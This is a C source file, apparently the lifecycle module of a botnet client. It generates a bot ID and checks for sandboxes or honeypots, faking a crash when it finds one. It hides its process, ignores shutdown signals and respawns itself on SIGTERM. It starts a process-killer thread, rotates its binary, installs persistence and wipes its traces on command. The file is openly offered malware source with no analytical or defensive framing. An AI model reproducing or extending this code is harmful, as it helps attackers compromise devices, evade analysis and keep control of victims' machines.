#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/un.h>

#define MODULE_TAG "lifecycle"
#include "headers/debug.h"

#include "headers/lifecycle.h"
#include "headers/rand.h"
#include "headers/adbg.h"
#include "headers/hide.h"
#include "headers/crypto.h"
#include "headers/manager.h"
#include "headers/killer.h"
#include "headers/watcher.h"
#include "headers/persist.h"
#include "headers/cleanup.h"

volatile sig_atomic_t running = 1;
static volatile sig_atomic_t respawn_on_exit = 0;
static int singleton_fd = -1;
static char bot_uuid[17] = {0};

void request_shutdown(void) {
    running = 0;
}

static void sigterm_handler(int sig) {
    (void)sig;
    respawn_on_exit = 1;
    running = 0;
}

static void ensure_single_instance(void) {
    static struct sockaddr_un lock_addr;

    singleton_fd = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (singleton_fd < 0) {
        DEBUG_PRINT("Failed to create abstract socket lock");
        return;
    }

    int flags = fcntl(singleton_fd, F_GETFD, 0);
    if (flags >= 0) {
        fcntl(singleton_fd, F_SETFD, flags | FD_CLOEXEC);
    }

    memset(&lock_addr, 0, sizeof(struct sockaddr_un));
    lock_addr.sun_family = AF_UNIX;

    strncpy(lock_addr.sun_path + 1, "m_bot_lock_instance", sizeof(lock_addr.sun_path) - 2);

    if (bind(singleton_fd, (struct sockaddr *)&lock_addr, sizeof(struct sockaddr_un)) < 0) {
        if (errno == EADDRINUSE) {
            DEBUG_PRINT("Another instance is already running. Exiting.");
            exit(0);
        }
    }
    DEBUG_PRINT("Single instance lock acquired.");
}

static void init_uuid(void) {
    /* Try loading UUID from persist metadata first */
    if (persist_load_uuid(bot_uuid, sizeof(bot_uuid)) == 0 && bot_uuid[0] != '\0')
        return;

    /* Generate new UUID */
    FILE *f = fopen("/dev/urandom", "r");
    if (f) {
        unsigned char rand_bytes[8];
        if (fread(rand_bytes, 1, 8, f) == 8) {
            sprintf(bot_uuid, "%02x%02x%02x%02x%02x%02x%02x%02x",
                    rand_bytes[0], rand_bytes[1], rand_bytes[2], rand_bytes[3],
                    rand_bytes[4], rand_bytes[5], rand_bytes[6], rand_bytes[7]);
        }
        fclose(f);
    }

    if (bot_uuid[0] == 0) {
        snprintf(bot_uuid, sizeof(bot_uuid), "%08x%08x", rand_next(), rand_next());
    }

    /* Store UUID in persist metadata (will be saved to disk by persist_install) */
    persist_set_uuid(bot_uuid);
}

const char *lifecycle_get_uuid(void) {
    return bot_uuid;
}

static void setup_signals(void) {
#ifndef DEBUG
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);

    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGALRM, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGURG, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
#endif

    signal(SIGPIPE, SIG_IGN);
    signal(SIGTERM, sigterm_handler);
}

int lifecycle_init(int argc, char **argv) {
    init_rand();
    adbg_init();

    if (adbg_is_under_analysis()) {
        DEBUG_PRINT("Environment identified as sandbox/honeypot, initiating fake crash.");
        adbg_fake_crash_and_chaos();
    }

#ifndef DEBUG
    hide(argc, argv);
#else
    (void)argc;
    (void)argv;
#endif

    ensure_single_instance();
    init_uuid();

    DEBUG_PRINT("=== Bot Starting (ID: %s) ===", bot_uuid);

    setup_signals();

    DEBUG_PRINT("Initializing crypto");
    crypto_init();

    DEBUG_PRINT("Initializing manager");
    manager_init();

    DEBUG_PRINT("Starting killer");
    start_killer();

    DEBUG_PRINT("Starting watcher");
    start_watcher();

    DEBUG_PRINT("Rotating binary + installing persistence");
    persist_rotate_binary();
    persist_install();

    return 0;
}

void lifecycle_shutdown(char **argv) {
    DEBUG_PRINT("Stopping killer thread");
    stop_killer();

    DEBUG_PRINT("Stopping watcher thread");
    stop_watcher();

    DEBUG_PRINT("Cleaning up manager");
    manager_cleanup();

    DEBUG_PRINT("Cleaning up crypto");
    crypto_cleanup();

    if (singleton_fd >= 0) {
        close(singleton_fd);
        singleton_fd = -1;
    }

    if (respawn_on_exit) {
        DEBUG_PRINT("SIGTERM received: Respawning binary...");
        char own_path[512] = {0};
        ssize_t path_len = readlink("/proc/self/exe", own_path, sizeof(own_path) - 1);
        if (path_len > 0) {
            own_path[path_len] = '\0';
            execve(own_path, argv, NULL);
            DEBUG_PRINT("execve failed to respawn: %s", strerror(errno));
        }
    }

    DEBUG_PRINT("=== Bot Exiting ===");
}

void lifecycle_handle_kill(void) {
    DEBUG_PRINT("KILL command received - wiping all traces");
    cleanup_full_wipe();
}
